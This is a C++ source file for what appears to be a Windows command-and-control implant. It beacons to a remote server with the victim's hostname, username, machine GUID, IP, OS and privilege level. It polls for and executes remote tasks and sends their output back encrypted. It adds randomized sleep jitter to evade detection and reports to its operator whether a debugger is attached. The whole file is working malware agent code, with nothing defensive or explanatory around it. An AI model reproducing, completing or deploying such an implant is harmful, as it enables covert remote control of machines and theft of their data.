#include "agent.h"
#include "../config/config.h"
#include "../utils/encoding.h"
#include "../utils/system_info.h"
#include "../utils/anti_debug.h"
#include "../tasks/task_manager.h"
#include "communication.h"

#include <windows.h>
#include <iostream>
#include <sstream>
#include <cstdlib>
#include <ctime>

namespace Core {
namespace Agent {

    // Global agent state
    static std::string g_agent_id;
    static int g_globalSleepTime = SLEEP_TIME;
    static int g_globalJitterMax = 30;
    static int g_globalJitterMin = 25;

    bool RegisterWithServer() {
        json registerData = {
            {"machine_guid", Utils::SystemInfo::GetMachineGuid()},
            {"hostname", Utils::SystemInfo::GetHostname()},
            {"username", Utils::SystemInfo::GetUsername()},
            {"internal_ip", Utils::SystemInfo::GetInternalIP()},
            {"external_ip", ""},
            {"os", Utils::SystemInfo::GetOSVersion()},
            {"process_arch", 1},
            {"integrity", Utils::SystemInfo::GetIntegrity()}
        };

        std::string encoded_data = Utils::Encoding::base64_encode(registerData.dump());

        json request_data = {
            {"data", encoded_data},
            {"ht", 1}  // requesttype.Registration.value
        };

        json responseObj;
        if (Core::Communication::SendEncryptedRequest(request_data, responseObj)) {
            if (responseObj.contains("agent_id")) {
                g_agent_id = responseObj["agent_id"].get<std::string>();
                PRINTF("[+] Registered successfully. Agent ID: %s\n", g_agent_id.c_str());
                
                // Report anti-debugging status after successful registration
                ReportDebugStatus();
                
                return true;
            }
        }
        
        PRINTF("[-] Registration failed\n");
        return false;
    }

    void RunMainLoop() {
        if (!IsRegistered()) {
            PRINTF("[ERROR] Agent not registered, cannot start main loop\n");
            return;
        }

        // Initialize random seed for jitter calculation
        srand((unsigned int)time(NULL));

        PRINTF("[INFO] Starting main execution loop\n");
        
        while (true) {
            PollForTasks();
            
            // Calculate sleep time with jitter
            int sleepTimeWithJitter = CalculateJitterSleep(g_globalSleepTime, g_globalJitterMax);
            PRINTF("[DEBUG] Sleeping for %d seconds\n", sleepTimeWithJitter);
            
            Sleep(sleepTimeWithJitter * 1000);
        }
    }

    void PollForTasks() {
        if (!IsRegistered()) {
            PRINTF("[ERROR] Cannot poll for tasks - agent not registered\n");
            return;
        }

        // Create the data structure the server expects
        json agentData = { {"agent_id", g_agent_id} };

        // Base64 encode the agent data
        std::string encoded_data = Utils::Encoding::base64_encode(agentData.dump());

        // Create the outer JSON structure with ht=2 for GetNextTask
        json requestData = {
            {"data", encoded_data},
            {"ht", 2}  // requesttype.GetNextTask.value
        };

        json task;
        if (Core::Communication::SendEncryptedRequest(requestData, task)) {
            // Check if the response is an error message
            if (task.contains("message") && task["message"] == "error") {
                PRINTF("[DEBUG] Received error response from server\n");
                return;
            }

            // Check if the task is empty (no task available)
            if (task.empty() || (task.size() == 1 && task.contains("message"))) {
                if (VERBOSE) {
                    PRINTF("[DEBUG] No task available.\n");
                }
                return;
            }

            // Only process if we have a valid task
            if (task.contains("type") && task.contains("id")) {
                PRINTF("[DEBUG] Task received: %s\n", task.dump().c_str());
                
                // Execute the task using the task manager
                Tasks::TaskResult tr = Tasks::TaskManager::ExecuteTask(task);
                
                // Send the response back to the server
                SendTaskResponse(task, static_cast<int>(tr.status), tr.output);
            }
            else {
                PRINTF("[DEBUG] Received invalid task format: %s\n", task.dump().c_str());
            }
        }
        else {
            PRINTF("[DEBUG] Failed to poll for tasks\n");
        }
    }

    bool SendTaskResponse(const json& task, int status, const std::string& output) {
        if (!IsRegistered()) {
            PRINTF("[ERROR] Cannot send task response - agent not registered\n");
            return false;
        }

        // Create the response data
        json responseData = {
            {"id", task["id"]},
            {"agent_id", g_agent_id},
            {"result", Utils::Encoding::base64_encode(output)},
            {"status", status}
        };

        // Base64 encode the response data
        std::string encoded_data = Utils::Encoding::base64_encode(responseData.dump());

        // Create the outer request with ht=3 for TaskResult
        json payload = {
            {"data", encoded_data},
            {"ht", 3}  // requesttype.TaskResult.value
        };

        PRINTF("[DEBUG] Response Data (Before Base64 Encoding): %s\n", responseData.dump().c_str());

        // Send the response using fire-and-forget
        if (Core::Communication::PostEncryptedFireAndForget(payload)) {
            PRINTF("[DEBUG] Task result sent successfully\n");
            return true;
        }
        else {
            CERR("[ERROR] Failed to send task response\n");
            return false;
        }
    }

    std::string GetAgentId() {
        return g_agent_id;
    }

    void SetAgentId(const std::string& id) {
        g_agent_id = id;
    }

    bool IsRegistered() {
        return !g_agent_id.empty();
    }

    void ReportDebugStatus() {
        if (!IsRegistered()) {
            return; // Can't report if not registered
        }

        bool debugDetected = Utils::AntiDebug::IsBeingDebugged();

        json debugData = {
            {"agent_id", g_agent_id},
            {"debug_detected", debugDetected},
            {"timestamp", time(NULL)}
        };

        std::string encoded_data = Utils::Encoding::base64_encode(debugData.dump());

        json debugRequest = {
            {"data", encoded_data},
            {"ht", 10}  // Debug report request type
        };

        // Fire and forget - we don't need a response
        Core::Communication::PostEncryptedFireAndForget(debugRequest);
        
        PRINTF("[DEBUG] Debug status reported: %s\n", debugDetected ? "DETECTED" : "CLEAN");
    }

    int CalculateJitterSleep(int sleepTime, int jitterPercentage) {
        // Calculate the maximum jitter value as a percentage of the sleep time
        int jitter = (sleepTime * jitterPercentage) / 100;
        
        // Generate a random jitter between 0 and jitter (inclusive)
        int randomJitter = rand() % (jitter + 1);
        
        // Return the sleep time increased by the random jitter
        return sleepTime + randomJitter;
    }

    void UpdateSleepConfig(int sleepTime, int jitterMax, int jitterMin) {
        g_globalSleepTime = sleepTime;
        g_globalJitterMax = jitterMax;
        g_globalJitterMin = jitterMin;
        
        // Validate jitter settings
        if (g_globalJitterMax < g_globalJitterMin) {
            g_globalJitterMin = 0;
        }
        
        PRINTF("[INFO] Sleep configuration updated: %d seconds, jitter_max: %d%%, jitter_min: %d%%\n",
               g_globalSleepTime, g_globalJitterMax, g_globalJitterMin);
    }

    void GetSleepConfig(int& sleepTime, int& jitterMax, int& jitterMin) {
        sleepTime = g_globalSleepTime;
        jitterMax = g_globalJitterMax;
        jitterMin = g_globalJitterMin;
    }

} // namespace Agent
} // namespace Core